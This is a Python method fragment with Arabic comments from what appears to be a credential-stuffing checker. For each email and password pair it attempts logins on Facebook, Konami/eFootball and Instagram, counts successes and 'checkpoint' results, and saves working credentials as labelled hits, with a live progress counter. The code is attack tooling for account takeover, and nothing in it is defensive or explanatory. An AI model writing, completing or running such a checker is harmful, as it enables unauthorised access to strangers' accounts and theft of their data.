    def worker(self, email, password):
        """العامل الذي يفحص ويحدد اسم التطبيق بجانب الإيميل"""
        chars = ['[●○○]', '[○●○]', '[○○●]', '[○●○]']
        self.loop += 1
        
        # العداد المتطور (السطر 218 وما بعده)
        sys.stdout.write(f"\r {W}{chars[self.loop % len(chars)]} {self.total_checked} | {G}OK:{self.oks} {Y}CP:{self.cps}{X}")
        sys.stdout.flush()
        
        # 1. فحص فيسبوك
        fb_res = self.checker.check_facebook(requests.Session(), email, password)
        if fb_res == "OK":
            self.oks += 1
            # هنا يظهر اسم التطبيق [FACEBOOK] مع النتيجة
            self.saver.save_hit("Facebook", f"[FACEBOOK] {email}|{password}")
        elif fb_res == "CP":
            self.cps += 1
            self.saver.save_hit("Facebook_CP", f"[FACEBOOK-SECURE] {email}|{password}")

        # 2. فحص كونامي (eFootball)
        kn_res = self.checker.check_konami_pro(email, password)
        if kn_res == "KONAMI_OK":
            self.oks += 1
            # حفظ اسم التطبيق [KONAMI] لتعرفه فوراً
            self.saver.save_hit("Konami", f"[KONAMI/PES] {email}|{password}")

        # 3. فحص إنستغرام
        ig_res = self.checker.check_instagram(email, password)
        if ig_res == "INSTA_OK":
            self.oks += 1
            self.saver.save_hit("Instagram", f"[INSTAGRAM] {email}|{password}")

        self.total_checked += 1

